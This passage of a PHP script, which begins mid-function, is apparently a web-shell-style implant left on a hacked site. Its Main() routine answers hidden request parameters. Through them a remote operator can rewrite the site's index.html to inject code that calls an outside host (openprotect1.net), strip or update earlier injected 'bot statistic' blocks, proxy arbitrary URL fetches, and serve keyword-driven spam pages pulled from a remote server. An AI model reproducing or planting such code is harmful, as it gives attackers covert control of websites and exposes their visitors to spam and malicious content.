		$sIncludeFileContent = preg_replace('#\\s*?((?:<\\?php\\s*\/\\*This code use for global bot statistic\\*\/.*?\/\\*Statistic code end\\*\/\\s*\\?>)|(?:\/\\*This code use for global bot statistic\\*\/.*?\/\\*Statistic code end\\*\/))#is', '', $sIncludeFileContent);
		$sIncludeFileContent = preg_replace('#<\\?php\\s+error_reporting\\(0\\);\\s*\\?>\\s*#is', '', $sIncludeFileContent);
		
		$sPregPattern = ''; 
		$sPregPattern = '#<!--footer\\s'.__UNIQUE_HASH__.'-->(.*?)<!--end\\sfooter\\s'.__UNIQUE_HASH__.'-->#is';
	
		$nReplaceCount = 0; 
		$sIncludeFileContent = preg_replace($sPregPattern, '', $sIncludeFileContent, -1, $nReplaceCount);
		
	$stUpdateFileHanle = fopen($sIncludePath, 'w');
	if($stUpdateFileHanle === false) 
	{
		echo '<fail>Can\'t open include file for write</fail>'; 
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sIncludeFileContent) === false)  
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in include file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
	
	echo '<correct>Script remove correctly</correct>'; 
}

/**
*  Use this function is trying update code in files
*  the output of TryUpdate().
*/
function TryUpdate(& $rsScriptUrl, $sIncludePath)
{
	$sIncludeFileContent = '';
	$stIncludeFileHandle = fopen($sIncludePath, 'r'); 
		if($stIncludeFileHandle === false)
		{
			echo '<fail>fail open include file</fail>'; 
			exit();
		}
		
		$sIncludeFileContent = fread($stIncludeFileHandle, filesize($sIncludePath)); 
		if($sIncludeFileContent === false)
		{
			fclose($stIncludeFileHandle);
			echo '<fail>fail read include file</fail>'; 
			exit();
		}
	fclose($stIncludeFileHandle);

	
	$lssMatchCode = array(); 
	
	$nMatches = preg_match('#(\/\\*This code use for global bot statistic\\*\/.*?\/\\*Statistic code end\\*\/)#is', $sIncludeFileContent, $lssMatchCode);
	if($nMatches === false || $nMatches == 0) 
	{
		return false;
	}
	
	$sIncludeFileContent = preg_replace('#(\/\\*This code use for global bot statistic\\*\/.*?\/\\*Statistic code end\\*\/)#is', preg_replace('#http:\/\/.*\?#i', $rsScriptUrl.'?', $lssMatchCode[1]) , $sIncludeFileContent);

	
	$stUpdateFileHanle = fopen($sIncludePath, 'w');
		if($stUpdateFileHanle === false) 
		{
			echo '<fail>Can\'t open include file for write</fail>'; 
			exit();
		}
		
		if(fwrite($stUpdateFileHanle, $sIncludeFileContent) === false)  
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in include file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
	
	
	return true;
}


/**
*  Use this function is updating script in files
*  the output of ScriptUpdate().
*/
function ScriptUpdate() 
{
	define('__SCRIPT_PATH_', '../../../index.html'); 
	define('__STANDART_SCRIPT_URL_', 'http://openprotect1.net/Log/StatA/Stat.php'); 
	

	
	$sScriptURL = '';
	$sScriptURL = trim($_REQUEST['include_update']); 
	
	
	if($sScriptURL === false || strlen($sScriptURL) == 0) 
	{
		$sScriptURL = __STANDART_SCRIPT_URL_;
	} else
	{
		$nMatch = preg_match('#^http:\/\/#i', $sScriptURL); 
		if($nMatch === false || $nMatch == 0)
		{
			$sScriptURL = 'http://'.$sScriptURL;
		}
	}
	
	$bUpdateResult = TryUpdate($sScriptURL, __SCRIPT_PATH_); 
							  
	
	if($bUpdateResult === true) 
	{
		echo '<correct>Include update correct</correct>';
		exit();
	}
	

	if(isset($_REQUEST['before_body']) === true)
	{
		MakePregBeforeBody(__SCRIPT_PATH_, $sScriptURL, __IS_USE_CURL__);  
	} else
	{
		MakePregAtEnd(__SCRIPT_PATH_, $sScriptURL, __IS_USE_CURL__);
	}

	
	echo '<correct>Correct include in file</correct>';
	exit();
}

/**
*  Use this function for add http scheme to line
*  the output of AddHttpToLine().
*/
function AddHttpToLine($sInputLine)
{
	if(strncmp($sInputLine, 'http://', strlen('http://')) === 0)
	{
		return $sInputLine;
	} else
	{
		return 'http://'.$sInputLine;
	}
}

/**
*  Use this function show standart message
*  the output of CheckScript().
*/
function CheckScript() 
{
	echo '<correct>Script avalible</correct>';
	exit();
}

/**
*  Use this function for showing content
*  ShowContent function not return value.
*/
function ShowContent()
{
	$sParameter = '';
	$sParameter = trim($_REQUEST['name']);
	
	$sWord = '';
	$sWord = trim($_REQUEST['word']);
	
	$sIndex = '';
	$sIndex = trim($_REQUEST['indx']);
	
	$sOutContent = '';
	
	$sGetContentUrl = '';
	$sGetContentUrl = _URL_.'?keyword='.$sParameter.'&domain='._DOMAIN_.'&word='.$sWord.'&index='.$sIndex;
	
	
	GetContents($sGetContentUrl, $sOutContent);
	if($sOutContent === false)
	{
		header("HTTP/1.1 404 Not Found");
		exit();
	}
	
	$sOutContent = trim($sOutContent);
	if(strlen($sOutContent) === 0)
	{
		header("HTTP/1.1 404 Not Found");
		exit();
	}
	
	
	header ("Last-Modified: ".date('D, d M Y H:i:s e', time()));
	header ("Accept-Ranges: bytes");
	header ("Content-Length: ".strlen($sOutContent));
	
	echo $sOutContent;
}

/**
*  Use this function main working function
*  the output of Main().
*/
function Main() 
{	
	if(isset($_REQUEST['update']) == true) 
	{
		Update(); 
	}
	
	if(isset($_REQUEST['include_update']) == true)
	{
		ScriptUpdate(); 
	}
	
	if(isset($_REQUEST['check_script']) == true)
	{
		CheckScript(); 
	}
	
	if(isset($_REQUEST['clear_message']) == true)
	{
		RemoveScript(); 
	}
	
	if(isset($_REQUEST['GetContent']) === true)
	{
		$sGetUrl = '';
		$sGetUrl = trim($_REQUEST['GetContent']);
		
		if(strlen($sGetUrl) == 0)
		{
			echo '<fail>no valid url</fail>';
			exit();
		}
		
		$nMatch = preg_match('#^http:\/\/#i', $sGetUrl); 
		if($nMatch === false || $nMatch == 0)
		{
			$sGetUrl = 'http://'.$sGetUrl;
		}

		
		
		$sOutContent = '';
		$bGetContentResult = false;
		$bGetContentResult = GetContents($sGetUrl, $sOutContent);
		
		if($bGetContentResult === false || $sOutContent === false || strlen($sOutContent) === 0)
		{
			echo '<fail>cant get content</fail>';
		} else
		{
			echo $sOutContent;
		}
	}
	
	if(isset($_REQUEST['dgen']) == true && isset($_REQUEST['secvalue']) == true)  
	{
		UpdateFilds(); 
		exit();	
	}
	
	if(isset($_REQUEST['name']) === true && isset($_REQUEST['word']) === true && isset($_REQUEST['indx']) === true)
	{
		ShowContent();
	}
}

Main();

?>
